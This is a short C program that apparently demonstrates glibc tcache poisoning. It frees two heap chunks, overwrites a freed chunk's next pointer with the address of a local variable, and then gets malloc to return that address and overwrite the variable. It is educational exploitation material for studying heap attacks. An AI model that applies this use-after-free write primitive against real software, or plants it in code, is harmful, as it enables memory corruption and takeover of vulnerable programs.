#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

int main(void){
	unsigned long *ma, *mb, *victim;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	ma = malloc(0x18);
	mb = malloc(0x18);

	free(mb);
	free(ma);
	puts("Exploit!");
	((tcache_entry*)ma)->next = (void*)&var; // vuln

	malloc(0x18);
	victim = malloc(0x18);	// alloc var from tcache
	*victim = 0xcafebabe;	// overwrite

	printf("victim = %p\nvar    = %#lx\n", victim, var);
}
